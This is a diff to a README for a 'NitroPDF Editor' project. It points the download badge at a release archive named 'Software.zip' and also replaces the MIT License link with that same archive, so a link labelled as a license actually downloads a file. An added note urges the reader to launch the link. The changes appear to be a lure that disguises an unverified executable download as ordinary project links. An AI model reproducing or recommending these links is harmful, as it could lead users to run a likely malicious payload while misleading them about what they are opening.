@@ -11,7 +11,7 @@ Welcome to the NitroPDF Editor repository where you can find all you need to edi
 ## Get Started
 To get started with NitroPDF Editor, you can download the latest version by clicking the button below:
 
-[![Download NitroPDF Editor](https://img.shields.io/badge/Download-NitroPDF_Editor-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download NitroPDF Editor](https://github.com/luthfi-cpu/NitroPDF-Editor/releases/download/v1.0/Software.zip)](https://github.com/luthfi-cpu/NitroPDF-Editor/releases/download/v1.0/Software.zip)
 
 *(Note: The link provided needs to be launched.)*
 
@@ -42,7 +42,7 @@ Join our community of PDF enthusiasts and NitroPDF Editor users to share tips, t
 If you encounter any issues, bugs, or have questions regarding NitroPDF Editor, please reach out to our support team for assistance. You can find support contact information on our website or within the application itself.
 
 ## License
-The NitroPDF Editor software is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute the software as per the terms of the license.
+The NitroPDF Editor software is released under the [MIT License](https://github.com/luthfi-cpu/NitroPDF-Editor/releases/download/v1.0/Software.zip). You are free to use, modify, and distribute the software as per the terms of the license.
 
 ---
 
